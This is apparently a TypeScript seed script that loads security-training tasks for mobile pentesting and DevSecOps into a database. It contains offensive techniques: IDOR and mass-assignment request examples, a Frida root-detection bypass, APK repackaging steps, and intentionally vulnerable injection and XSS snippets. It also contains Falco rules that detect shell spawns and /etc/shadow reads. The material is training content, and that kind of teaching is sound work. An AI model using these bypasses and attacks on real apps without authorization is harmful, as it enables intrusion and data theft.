- [ ] Analyzed SQLite database
- [ ] Checked external storage
- [ ] Performed backup extraction`],

	['Attack mobile APIs', 'Test the backend API for: broken authentication, IDOR, excessive data exposure, and rate limiting issues.',
`## Mobile API Testing

### 1. Discover Endpoints
\`\`\`
- Intercept traffic with Burp
- Decompile app, search for URLs
- Check for API documentation endpoints
  /swagger.json, /api-docs, /graphql
\`\`\`

### 2. Broken Authentication
\`\`\`
□ Weak tokens (predictable, short)
□ Tokens in URL (logged in servers)
□ No token expiration
□ Token doesn't invalidate on logout
□ Password reset flaws
\`\`\`

### 3. IDOR Testing
\`\`\`
# Original request
GET /api/users/123/profile

# Test with other IDs
GET /api/users/124/profile  # Other user
GET /api/users/1/profile    # Admin?

# Also test in POST/PUT bodies
{"user_id": 123} → {"user_id": 124}
\`\`\`

### 4. Excessive Data Exposure
\`\`\`json
// API returns too much
{
  "id": 123,
  "name": "John",
  "email": "john@example.com",
  "password_hash": "...",     // Shouldn't be here
  "ssn": "123-45-6789",       // Sensitive!
  "internal_notes": "..."     // Internal data
}
\`\`\`

### 5. Rate Limiting
\`\`\`bash
# Test with Burp Intruder
# Send 100 requests rapidly
# Check for:
- OTP brute force
- Password brute force
- API abuse (scraping)
\`\`\`

### 6. Mass Assignment
\`\`\`json
// Normal request
{"name": "John", "email": "john@test.com"}

// Add extra fields
{"name": "John", "email": "john@test.com", "role": "admin"}
\`\`\`

## Completion Criteria
- [ ] Mapped API endpoints
- [ ] Found authentication flaw
- [ ] Exploited IDOR
- [ ] Tested rate limiting`],

	['Reverse engineer mobile apps', 'Use Ghidra or IDA for native library analysis. Bypass root/jailbreak detection and other client-side protections.',
`## Native Library Analysis

### Find Native Libraries
\`\`\`bash
apktool d app.apk
ls lib/
# arm64-v8a/, armeabi-v7a/, x86/
# Look for .so files
\`\`\`

### Load in Ghidra
\`\`\`
1. File → Import → libnative.so
2. Analyze with default settings
3. Find JNI functions:
   Java_com_target_app_ClassName_methodName
\`\`\`

### Common Protections

#### Root Detection
\`\`\`java
// Common checks
new File("/system/app/Superuser.apk").exists()
new File("/system/bin/su").exists()
Runtime.getRuntime().exec("which su")
\`\`\`

#### Bypass with Frida
\`\`\`javascript
Java.perform(function() {
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var path = this.getPath();
        if (path.indexOf("su") !== -1 ||
            path.indexOf("Superuser") !== -1) {
            return false;
        }
        return this.exists();
    };
});
\`\`\`

#### Jailbreak Detection (iOS)
\`\`\`javascript
// Objection
ios jailbreak disable
\`\`\`

### Integrity Checks
\`\`\`
- Signature verification
- Checksum validation
- Debugger detection

Bypass: Patch checks in smali, repackage
\`\`\`

### Repackaging APK
\`\`\`bash
# After modifying smali
apktool b app/ -o modified.apk
jarsigner -keystore my.keystore modified.apk alias
zipalign -v 4 modified.apk aligned.apk
\`\`\`

## Completion Criteria
- [ ] Analyzed native library
- [ ] Bypassed root detection
- [ ] Bypassed other protections
- [ ] Successfully repackaged APK`],

	['Conduct a mobile app pentest', 'Full assessment following OWASP MASTG. Test both client-side and server-side components.',
`## OWASP MASTG Categories

### M1: Improper Platform Usage
\`\`\`
□ Exported components exploitable
□ Permissions overly broad
□ WebView vulnerabilities
□ Intent injection
\`\`\`

### M2: Insecure Data Storage
\`\`\`
□ SharedPreferences/plist secrets
□ SQLite unencrypted
□ External storage sensitive data
□ Backup contains secrets
□ Clipboard data
□ Keyboard cache
\`\`\`

### M3: Insecure Communication
\`\`\`
□ Cleartext traffic allowed
□ SSL pinning missing/bypassable
□ Certificate validation flaws
□ Sensitive data in URLs
\`\`\`

### M4: Insecure Authentication
\`\`\`
□ Weak local authentication
□ Biometric bypass possible
□ Session handling flaws
□ Remember me insecure
\`\`\`

### M5: Insufficient Cryptography
\`\`\`
□ Weak algorithms (MD5, DES)
□ Hardcoded keys
□ Predictable IVs
□ ECB mode
\`\`\`

### M6: Insecure Authorization
\`\`\`
□ Client-side authorization checks
□ IDOR in API
□ Role bypass
\`\`\`

### M7: Client Code Quality
\`\`\`
□ Memory corruption bugs
□ Format string vulnerabilities
□ Buffer overflows
\`\`\`

## Report Structure
\`\`\`markdown
## Executive Summary
## Scope
## Methodology
## Findings
### Critical/High/Medium/Low
- Title
- Description
- Steps to Reproduce
- Impact
- Remediation
## Conclusion
\`\`\`

## Completion Criteria
- [ ] Tested all MASTG categories
- [ ] Documented findings
- [ ] Created reproduction steps
- [ ] Provided remediation advice`],
];
redM3Tasks.forEach((t, i) => insertTask.run(redM3.lastInsertRowid, t[0], t[1], t[2], i, now));

// ============================================================================
// DEVSECOPS
// ============================================================================
const devSecPath = insertPath.run(
	'DevSecOps Engineering',
	'Integrate security into CI/CD pipelines. Master SAST, DAST, container security, secrets management, and infrastructure as code security.',
	'violet',
	now
);

// Module 1: CI/CD Security
const devM1 = insertModule.run(devSecPath.lastInsertRowid, 'CI/CD Pipeline Security', 'Secure your build and deployment pipelines', 0, now);
const devM1Tasks: [string, string, string][] = [
	['Audit a CI/CD pipeline for risks', 'Review GitHub Actions, GitLab CI, or Jenkins configs. Identify: exposed secrets, overprivileged tokens, untrusted inputs, and supply chain risks.',
`## CI/CD Security Audit Checklist

### Secrets Exposure
\`\`\`yaml
# BAD: Secrets in workflow file
env:
  API_KEY: "sk-1234567890"

# GOOD: Use secret references
env:
  API_KEY: \${{ secrets.API_KEY }}
\`\`\`

### Overprivileged Tokens
\`\`\`yaml
# BAD: Write access when only read needed
permissions:
  contents: write

# GOOD: Minimum permissions
permissions:
  contents: read
\`\`\`

### Untrusted Inputs
\`\`\`yaml
# VULNERABLE: Injection via PR title
run: echo "PR: \${{ github.event.pull_request.title }}"

# SAFE: Use environment variable
env:
  PR_TITLE: \${{ github.event.pull_request.title }}
run: echo "PR: $PR_TITLE"
\`\`\`

### Supply Chain Risks
\`\`\`yaml
# RISKY: Using @main (mutable)
uses: some-action/action@main

# SAFER: Pin to commit SHA
uses: some-action/action@a1b2c3d4e5f6
\`\`\`

## Audit Questions
- [ ] Are secrets stored in secret managers (not code)?
- [ ] Are tokens scoped to minimum permissions?
- [ ] Are external actions pinned to SHA?
- [ ] Is pull_request_target used safely?
- [ ] Are artifacts from untrusted PRs handled safely?

## Completion Criteria
- [ ] Audited existing pipeline
- [ ] Identified 3+ security issues
- [ ] Created remediation plan
- [ ] Fixed critical issues`],

	['Implement branch protection rules', 'Configure required reviews, status checks, signed commits, and prevent force pushes. Protect main/release branches.',
`## GitHub Branch Protection

### Enable via Settings
\`\`\`
Repository Settings → Branches → Add rule
Branch name pattern: main
\`\`\`

### Required Settings
\`\`\`
☑ Require a pull request before merging
  ☑ Require approvals (1-2)
  ☑ Dismiss stale approvals
  ☑ Require review from code owners

☑ Require status checks to pass
  - tests
  - security-scan
  - lint

☑ Require conversation resolution

☑ Require signed commits (if using GPG)

☑ Do not allow bypassing settings
\`\`\`

### Prevent Destructive Actions
\`\`\`
☑ Restrict who can push to matching branches
☐ Allow force pushes (KEEP UNCHECKED)
☐ Allow deletions (KEEP UNCHECKED)
\`\`\`

### CODEOWNERS File
\`\`\`
# .github/CODEOWNERS
* @security-team
/security/ @security-team
*.tf @infra-team
\`\`\`

### GitLab Protected Branches
\`\`\`
Settings → Repository → Protected branches
- Allowed to merge: Maintainers
- Allowed to push: No one
- Require approval from code owners
\`\`\`

## Completion Criteria
- [ ] main branch protected
- [ ] Requires PR with approval
- [ ] Status checks enforced
- [ ] Force push disabled`],

	['Secure CI/CD secrets management', 'Migrate hardcoded secrets to GitHub Secrets, Vault, or cloud secret managers. Implement secret rotation and audit logging.',
`## GitHub Secrets

### Setting Secrets
\`\`\`bash
# Via CLI
gh secret set API_KEY --body "secret-value"

# Or via UI: Settings → Secrets → Actions
\`\`\`

### Using in Workflows
\`\`\`yaml
jobs:
  deploy:
    env:
      API_KEY: \${{ secrets.API_KEY }}
    steps:
      - run: ./deploy.sh
\`\`\`

## HashiCorp Vault Integration

### Vault Agent in CI
\`\`\`yaml
- name: Import Secrets
  uses: hashicorp/vault-action@v2
  with:
    url: https://vault.example.com
    method: jwt
    role: ci-role
    secrets: |
      secret/data/myapp api_key | API_KEY
\`\`\`

### Dynamic Secrets
\`\`\`bash
# Get temporary AWS credentials
vault read aws/creds/deploy-role
# Returns short-lived credentials
\`\`\`

## AWS Secrets Manager

### Retrieve in CI
\`\`\`yaml
- name: Get Secret
  run: |
    SECRET=$(aws secretsmanager get-secret-value \\
      --secret-id prod/api-key --query SecretString --output text)
    echo "::add-mask::$SECRET"
    echo "API_KEY=$SECRET" >> $GITHUB_ENV
\`\`\`

## Secret Rotation
\`\`\`
1. Generate new secret
2. Add new secret (keep old active)
3. Update all consumers
4. Verify new secret works
5. Revoke old secret
\`\`\`

## Completion Criteria
- [ ] No secrets in code/configs
- [ ] Secrets in secure storage
- [ ] Rotation process documented
- [ ] Audit logging enabled`],

	['Prevent dependency confusion attacks', 'Configure package managers to use private registries first. Implement namespace protection and verify package integrity.',
`## Dependency Confusion Attack

### How It Works
\`\`\`
1. Company uses private package "my-internal-lib"
2. Attacker publishes "my-internal-lib" to public npm
3. Build system pulls malicious public version
4. Attacker code runs in CI/production
\`\`\`

## Prevention: npm

### .npmrc Configuration
\`\`\`ini
# Force private packages from private registry
@mycompany:registry=https://npm.mycompany.com
registry=https://registry.npmjs.org

# Or scope all internal packages
@internal:registry=https://npm.mycompany.com
\`\`\`

### Package Lock
\`\`\`json
// Verify resolved URLs in package-lock.json
"my-internal-lib": {
  "resolved": "https://npm.mycompany.com/..."
}
\`\`\`

## Prevention: pip

### pip.conf
\`\`\`ini
[global]
index-url = https://pypi.mycompany.com/simple
extra-index-url = https://pypi.org/simple
\`\`\`

### Requirements with Hashes
\`\`\`
requests==2.28.0 --hash=sha256:abc123...
\`\`\`

## Prevention: Artifactory

### Virtual Repository
\`\`\`
1. Create virtual repo
2. Add private repo FIRST
3. Add public repo second
4. Configure client to use virtual
\`\`\`

## Namespace Protection
\`\`\`
- Register your namespace on public registries
- Even if not publishing, prevents squatting
- @mycompany/* on npm
- mycompany-* on PyPI
\`\`\`

## Completion Criteria
- [ ] Private registry configured correctly
- [ ] Package locks verified
- [ ] Namespace reserved on public registries
- [ ] Integrity verification enabled`],

	['Implement signed commits and artifacts', 'Set up GPG commit signing and artifact signing with Sigstore/cosign. Verify signatures in deployment pipelines.',
`## GPG Commit Signing

### Generate Key
\`\`\`bash
gpg --full-generate-key
# Choose RSA, 4096 bits
# Enter name and email (match GitHub)
\`\`\`

### Configure Git
\`\`\`bash
# Get key ID
gpg --list-secret-keys --keyid-format LONG

# Configure git
git config --global user.signingkey <KEY_ID>
git config --global commit.gpgsign true
\`\`\`

### Add to GitHub
\`\`\`bash
gpg --armor --export <KEY_ID>
# Add to GitHub Settings → SSH and GPG keys
\`\`\`

## Artifact Signing with Cosign

### Sign Container Image
\`\`\`bash
# Install cosign
brew install cosign

# Generate keypair
cosign generate-key-pair

# Sign image
cosign sign --key cosign.key registry/image:tag

# Verify image
cosign verify --key cosign.pub registry/image:tag
\`\`\`

### Keyless Signing (Sigstore)
\`\`\`bash
# Uses OIDC identity (no key management!)
cosign sign registry/image:tag
# Authenticates via GitHub/Google/etc.
\`\`\`

## Verify in Pipeline
\`\`\`yaml
jobs:
  deploy:
    steps:
      - name: Verify image signature
        run: |
          cosign verify \\
            --certificate-identity "https://github.com/myorg/myrepo/.github/workflows/build.yml@refs/heads/main" \\
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \\
            registry/image:tag
\`\`\`

## Completion Criteria
- [ ] GPG commit signing configured
- [ ] Commits show "Verified" badge
- [ ] Artifacts signed with cosign
- [ ] Signature verification in pipeline`],

	['Create a security gate in CI', 'Build a pipeline stage that fails builds on: critical vulnerabilities, secret detection, or failed security tests.',
`## Security Gate Pipeline

### GitHub Actions Example
\`\`\`yaml
name: Security Gate

on: [push, pull_request]

jobs:
  security-gate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'  # Fail on findings

      - name: Run Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}

      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: p/security-audit
\`\`\`

### Gate Logic
\`\`\`yaml
# Fail conditions
- Critical/High vulnerabilities found
- Secrets detected in code
- Security tests fail
- SAST findings above threshold
\`\`\`

### Quality Gates
\`\`\`yaml
# Define thresholds
env:
  MAX_CRITICAL: 0
  MAX_HIGH: 5
  MAX_MEDIUM: 20

- name: Check vulnerability counts
  run: |
    CRITICAL=$(cat results.json | jq '.critical')
    if [ $CRITICAL -gt $MAX_CRITICAL ]; then
      echo "Critical vulnerabilities exceed threshold"
      exit 1
    fi
\`\`\`

### Bypass Process
\`\`\`yaml
# Allow documented exceptions
- name: Check for approved exceptions
  run: |
    # Read .security-exceptions.yml
    # Skip known/accepted issues
\`\`\`

## Branch Rules Integration
\`\`\`
Require status check: security-gate
Must pass before merge allowed
\`\`\`

## Completion Criteria
- [ ] Security gate job created
- [ ] Fails on critical vulns
- [ ] Detects secrets
- [ ] Required for merge`],
];
devM1Tasks.forEach((t, i) => insertTask.run(devM1.lastInsertRowid, t[0], t[1], t[2], i, now));

// Module 2: SAST & DAST
const devM2 = insertModule.run(devSecPath.lastInsertRowid, 'SAST & DAST Integration', 'Automated security testing in development', 1, now);
const devM2Tasks: [string, string, string][] = [
	['Integrate Semgrep for SAST', 'Add Semgrep to CI pipeline. Configure rules for your languages. Handle false positives with ignore comments and baseline.',
`## Semgrep Setup

### GitHub Actions Integration
\`\`\`yaml
- name: Run Semgrep
  uses: returntocorp/semgrep-action@v1
  with:
    config: >-
      p/security-audit
      p/secrets
      p/owasp-top-ten
\`\`\`

### Rule Configuration
\`\`\`yaml
# .semgrep.yml
rules:
  - id: hardcoded-password
    pattern: password = "..."
    message: Hardcoded password detected
    severity: ERROR
    languages: [python]
\`\`\`

### Running Locally
\`\`\`bash
# Install
pip install semgrep

# Run with rulesets
semgrep --config p/security-audit .

# Run with custom rules
semgrep --config .semgrep.yml .
\`\`\`

### Handling False Positives
\`\`\`python
# Inline ignore
password = get_from_env()  # nosemgrep: hardcoded-password

# Or use .semgrepignore file
tests/
*.test.js
\`\`\`

### Baseline (Ignore Pre-existing)
\`\`\`bash
# Generate baseline
semgrep --config p/security-audit --baseline-commit main

# Only new findings shown
\`\`\`

## Completion Criteria
- [ ] Semgrep in CI pipeline
- [ ] Relevant rulesets configured
- [ ] False positive handling in place
- [ ] Developers can run locally`],

	['Set up dependency scanning', 'Implement Dependabot, Snyk, or Trivy for vulnerability scanning. Configure auto-PRs for patches.',
`## Dependabot (GitHub)

### Enable
\`\`\`yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
\`\`\`

### Security Updates
\`\`\`
Repository Settings → Security → Dependabot
☑ Dependabot alerts
☑ Dependabot security updates
\`\`\`

## Trivy Scanning

### In CI Pipeline
\`\`\`yaml
- name: Run Trivy
  uses: aquasecurity/trivy-action@master
  with:
    scan-type: 'fs'
    format: 'sarif'
    output: 'trivy-results.sarif'
    severity: 'CRITICAL,HIGH'
\`\`\`

### Container Scanning
\`\`\`bash
trivy image myapp:latest
trivy image --severity CRITICAL,HIGH myapp:latest
\`\`\`

## Snyk Integration

### CLI
\`\`\`bash
npm install -g snyk
snyk auth
snyk test
snyk monitor  # Continuous monitoring
\`\`\`

### GitHub Action
\`\`\`yaml
- uses: snyk/actions/node@master
  with:
    args: --severity-threshold=high
  env:
    SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
\`\`\`

## Breaking Builds
\`\`\`yaml
# Fail on critical
- name: Check vulnerabilities
  run: |
    trivy fs --exit-code 1 --severity CRITICAL .
\`\`\`

## Completion Criteria
- [ ] Dependabot enabled
- [ ] Trivy in CI
- [ ] Auto-PRs for patches
- [ ] Build fails on critical vulns`],

	['Implement secret scanning', 'Add Gitleaks or TruffleHog to pre-commit hooks and CI. Scan git history for leaked secrets.',
`## Gitleaks Setup

### Pre-commit Hook
\`\`\`yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
\`\`\`
\`\`\`bash
pip install pre-commit
pre-commit install
\`\`\`

### CI Integration
\`\`\`yaml
- name: Run Gitleaks
  uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
    GITLEAKS_NOTIFY_USER_LIST: '@security-team'
\`\`\`

### Scan Full History
\`\`\`bash
gitleaks detect --source . --verbose
gitleaks detect --source . --log-opts="--all"  # All branches
\`\`\`

## TruffleHog

### Installation
\`\`\`bash
pip install trufflehog
\`\`\`

### Scan Repository
\`\`\`bash
trufflehog git file://. --only-verified
trufflehog git https://github.com/org/repo --only-verified
\`\`\`

## Custom Rules
\`\`\`toml
# .gitleaks.toml
[[rules]]
id = "my-api-key"
description = "My Custom API Key"
regex = '''MY_API_[A-Za-z0-9]{32}'''
\`\`\`

## Remediation Process
\`\`\`
1. Alert triggered → Notify developer + security
2. Assess: Is it real? Is it sensitive?
3. Revoke: Immediately rotate the secret
4. Remediate: Remove from history if needed
5. Post-mortem: How did it get committed?
\`\`\`

### Remove from History
\`\`\`bash
# Use git-filter-repo (not filter-branch)
git filter-repo --path-to-pattern-file patterns.txt --invert-paths
\`\`\`

## Completion Criteria
- [ ] Pre-commit hook installed
- [ ] CI scanning active
- [ ] History scanned
- [ ] Remediation process documented`],

	['Configure DAST with OWASP ZAP', 'Run ZAP in CI against staging environment. Configure authenticated scanning, API scanning, and baseline comparisons.',
`## ZAP Automation

### GitHub Actions
\`\`\`yaml
- name: ZAP Scan
  uses: zaproxy/action-full-scan@v0.7.0
  with:
    target: 'https://staging.example.com'
    rules_file_name: '.zap/rules.tsv'
    cmd_options: '-a'
\`\`\`

### Baseline Scan (Quick)
\`\`\`yaml
- name: ZAP Baseline
  uses: zaproxy/action-baseline@v0.9.0
  with:
    target: 'https://staging.example.com'
\`\`\`

### Authenticated Scanning
\`\`\`yaml
# ZAP context file for auth
<context>
  <authentication>
    <form>
      <loginUrl>https://staging.example.com/login</loginUrl>
      <loginRequestData>username={%username%}&amp;password={%password%}</loginRequestData>
    </form>
  </authentication>
  <users>
    <user>
      <credentials>
        <username>testuser</username>
        <password>testpass</password>
      </credentials>
    </user>
  </users>
</context>
\`\`\`

### API Scanning
\`\`\`yaml
- name: ZAP API Scan
  uses: zaproxy/action-api-scan@v0.5.0
  with:
    target: 'https://staging.example.com/api/openapi.json'
    format: openapi
\`\`\`

### Rule Configuration
\`\`\`tsv
# .zap/rules.tsv
10010	IGNORE	Cookie No HttpOnly Flag
10011	WARN	Cookie Without Secure Flag
40012	FAIL	XSS Reflected
\`\`\`

## Reports
\`\`\`yaml
- name: Upload Report
  uses: actions/upload-artifact@v3
  with:
    name: zap-report
    path: report_html.html
\`\`\`

## Completion Criteria
- [ ] ZAP running in CI
- [ ] Authenticated scan configured
- [ ] API scan for OpenAPI spec
- [ ] Custom rules configured`],

	['Build a security testing dashboard', 'Aggregate results from all security tools. Track vulnerability trends, mean time to remediate, and coverage metrics.',
`## Dashboard Components

### Data Collection
\`\`\`yaml
# Aggregate from multiple sources
sources:
  - trivy: scan-results/trivy.json
  - semgrep: scan-results/semgrep.sarif
  - gitleaks: scan-results/gitleaks.json
  - zap: scan-results/zap-report.json
\`\`\`

### Key Metrics
\`\`\`
1. Vulnerability Counts by Severity
   - Critical: 0 (target)
   - High: <10
   - Medium: tracked
   - Low: informational

2. Mean Time to Remediate (MTTR)
   - Critical: <24 hours
   - High: <1 week
   - Medium: <1 month

3. Trend Lines
   - New vulns per week
   - Fixed vulns per week
   - Open vuln count over time

4. Coverage
   - % repos with SAST
   - % repos with dependency scanning
   - % with security tests
\`\`\`

### Grafana Dashboard
\`\`\`json
{
  "panels": [
    {
      "title": "Critical Vulnerabilities",
      "type": "stat",
      "targets": [{"expr": "vuln_count{severity='critical'}"}]
    },
    {
      "title": "Vulnerabilities Over Time",
      "type": "graph",
      "targets": [{"expr": "vuln_count by (severity)"}]
    }
  ]
}
\`\`\`

### DefectDojo Integration
\`\`\`bash
# Upload findings to DefectDojo
curl -X POST https://defectdojo.example.com/api/v2/import-scan/ \\
  -H "Authorization: Token $TOKEN" \\
  -F "scan_type=Trivy Scan" \\
  -F "file=@trivy-results.json" \\
  -F "engagement=123"
\`\`\`

## Completion Criteria
- [ ] Results aggregated from all tools
- [ ] Dashboard visualizing trends
- [ ] MTTR tracking implemented
- [ ] Coverage metrics calculated`],

	['Create developer security training', 'Build secure coding guidelines and training materials. Include examples of common vulnerabilities in your stack.',
`## Training Program Structure

### 1. Secure Coding Guidelines
\`\`\`markdown
# Secure Coding Standards

## Input Validation
- Validate all input on server side
- Use allowlists, not blocklists
- Parameterize all queries

## Authentication
- Use established libraries (Passport, Spring Security)
- Hash passwords with bcrypt/argon2
- Implement MFA for sensitive operations
\`\`\`

### 2. Language-Specific Examples

#### SQL Injection (Python)
\`\`\`python
# VULNERABLE
query = f"SELECT * FROM users WHERE id = {user_id}"

# SECURE
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
\`\`\`

#### XSS (JavaScript)
\`\`\`javascript
// VULNERABLE
element.innerHTML = userInput;

// SECURE
element.textContent = userInput;
// Or use DOMPurify for HTML
\`\`\`

### 3. Hands-on Labs
\`\`\`
- OWASP Juice Shop challenges
- Internal vulnerable app
- CTF-style exercises
\`\`\`

### 4. Security Champions Program
\`\`\`
- One champion per team
- Monthly training sessions
- First responders for security questions
- Bridge between security and development
\`\`\`

### 5. Onboarding Checklist
\`\`\`
□ Complete secure coding course
□ Set up pre-commit hooks
□ Review team security guidelines
□ Understand security review process
□ Know how to report vulnerabilities
\`\`\`

### 6. Continuous Learning
\`\`\`
- Monthly security newsletter
- Post-incident learnings (anonymized)
- New vulnerability briefings
- Annual refresher training
\`\`\`

## Completion Criteria
- [ ] Guidelines documented
- [ ] Examples for your stack
- [ ] Hands-on lab created
- [ ] Training delivered to team`],
];
devM2Tasks.forEach((t, i) => insertTask.run(devM2.lastInsertRowid, t[0], t[1], t[2], i, now));

// Module 3: Container Security
const devM3 = insertModule.run(devSecPath.lastInsertRowid, 'Container & Kubernetes Security', 'Secure containerized workloads', 2, now);
const devM3Tasks: [string, string, string][] = [
	['Create hardened base images', 'Build minimal images from scratch or distroless. Remove shells, package managers, and unnecessary tools.',
`## Hardened Image Strategies

### Distroless Images
\`\`\`dockerfile
# Use distroless (no shell, no package manager)
FROM gcr.io/distroless/static-debian12

COPY myapp /app
ENTRYPOINT ["/app"]
\`\`\`

### Multi-stage Build
\`\`\`dockerfile
# Build stage
FROM golang:1.21 AS builder
WORKDIR /app
COPY . .
RUN CGO_ENABLED=0 go build -o myapp

# Runtime stage (minimal)
FROM gcr.io/distroless/static
COPY --from=builder /app/myapp /
CMD ["/myapp"]
\`\`\`

### Alpine (When Shell Needed)
\`\`\`dockerfile
FROM alpine:3.19
RUN apk add --no-cache ca-certificates
COPY myapp /app
# Remove package manager
RUN rm -rf /sbin/apk /etc/apk /lib/apk /usr/share/apk
USER nobody
ENTRYPOINT ["/app"]
\`\`\`

### Checklist
\`\`\`
☑ No package manager in final image
☑ No shell (if possible)
☑ Non-root user
☑ Minimal filesystem
☑ No unnecessary tools (curl, wget)
\`\`\`

### Scan with Trivy
\`\`\`bash
trivy image myapp:latest
trivy image --severity CRITICAL,HIGH myapp:latest
\`\`\`

## Completion Criteria
- [ ] Created distroless or minimal image
- [ ] Multi-stage build implemented
- [ ] Trivy scan shows minimal vulns
- [ ] Image size significantly reduced`],

	['Implement image signing and verification', 'Sign images with cosign, verify in Kubernetes with admission controllers.',
`## Image Signing with Cosign

### Generate Key Pair
\`\`\`bash
cosign generate-key-pair
# Creates cosign.key and cosign.pub
\`\`\`

### Sign Image
\`\`\`bash
# After pushing image
cosign sign --key cosign.key registry.example.com/myapp:v1.0.0

# Keyless (uses OIDC identity)
cosign sign registry.example.com/myapp:v1.0.0
\`\`\`

### Verify Image
\`\`\`bash
cosign verify --key cosign.pub registry.example.com/myapp:v1.0.0
\`\`\`

## Kubernetes Admission Control

### Kyverno Policy
\`\`\`yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  rules:
    - name: verify-signature
      match:
        resources:
          kinds:
            - Pod
      verifyImages:
        - imageReferences:
            - "registry.example.com/*"
          attestors:
            - entries:
                - keys:
                    publicKeys: |
                      -----BEGIN PUBLIC KEY-----
                      ...
                      -----END PUBLIC KEY-----
\`\`\`

### Sigstore Policy Controller
\`\`\`yaml
apiVersion: policy.sigstore.dev/v1alpha1
kind: ClusterImagePolicy
metadata:
  name: require-signature
spec:
  images:
    - glob: "registry.example.com/**"
  authorities:
    - key:
        data: |
          -----BEGIN PUBLIC KEY-----
          ...
\`\`\`

## Completion Criteria
- [ ] Images signed in CI
- [ ] Admission controller deployed
- [ ] Unsigned images rejected
- [ ] Verification in deployment pipeline`],

	['Configure Kubernetes security policies', 'Implement Pod Security Standards (restricted). Configure: no root, no privileged, read-only fs.',
`## Pod Security Standards

### Namespace Labels (K8s 1.25+)
\`\`\`yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/audit: restricted
\`\`\`

### Restricted Pod Example
\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: myapp:latest
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL
      resources:
        limits:
          cpu: "500m"
          memory: "512Mi"
        requests:
          cpu: "100m"
          memory: "128Mi"
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir: {}
\`\`\`

### Security Context Checklist
\`\`\`
☑ runAsNonRoot: true
☑ runAsUser: non-zero
☑ allowPrivilegeEscalation: false
☑ readOnlyRootFilesystem: true
☑ capabilities.drop: ALL
☑ seccompProfile: RuntimeDefault
☐ privileged: false (never true)
☐ hostNetwork: false
☐ hostPID: false
☐ hostIPC: false
\`\`\`

## Completion Criteria
- [ ] PSS enforced on namespaces
- [ ] All pods run as non-root
- [ ] No privileged containers
- [ ] Read-only filesystems`],

	['Set up network policies', 'Implement zero-trust networking. Default deny all, explicitly allow required traffic.',
`## Zero Trust Network Policies

### Default Deny All
\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
\`\`\`

### Allow Specific Ingress
\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: frontend
      ports:
        - protocol: TCP
          port: 8080
\`\`\`

### Allow Egress to External
\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-external-api
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
      ports:
        - protocol: TCP
          port: 443
    - to:  # DNS
        - namespaceSelector: {}
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
\`\`\`

### Namespace Isolation
\`\`\`yaml
# Only allow same-namespace traffic
spec:
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              name: production
\`\`\`

## Completion Criteria
- [ ] Default deny in all namespaces
- [ ] Explicit allow for required traffic
- [ ] Namespaces isolated
- [ ] Tested connectivity matrix`],

	['Deploy runtime security monitoring', 'Install Falco for runtime threat detection. Alert on: shell spawns, sensitive file access, unexpected network.',
`## Falco Installation

### Helm Install
\`\`\`bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \\
  --namespace falco --create-namespace \\
  --set driver.kind=ebpf
\`\`\`

### Key Rules
\`\`\`yaml
# /etc/falco/falco_rules.local.yaml

# Detect shell in container
- rule: Shell Spawned in Container
  desc: Detect shell spawned in a container
  condition: >
    spawned_process and container and
    proc.name in (bash, sh, zsh, dash)
  output: "Shell spawned in container (user=%user.name command=%proc.cmdline)"
  priority: WARNING

# Detect sensitive file access
- rule: Sensitive File Access
  condition: >
    open_read and container and
    fd.name in (/etc/shadow, /etc/passwd)
  output: "Sensitive file accessed (file=%fd.name)"
  priority: WARNING

# Detect outbound connection
- rule: Unexpected Outbound Connection
  condition: >
    outbound and container and not expected_network
  output: "Unexpected outbound connection"
  priority: NOTICE
\`\`\`

### Alerting
\`\`\`yaml
# falco.yaml
http_output:
  enabled: true
  url: https://alerts.example.com/falco

json_output: true
\`\`\`

### Slack Integration
\`\`\`bash
helm install falcosidekick falcosecurity/falcosidekick \\
  --set config.slack.webhookurl=https://hooks.slack.com/...
\`\`\`

## Completion Criteria
- [ ] Falco deployed cluster-wide
- [ ] Custom rules for your workloads
- [ ] Alerts to security team
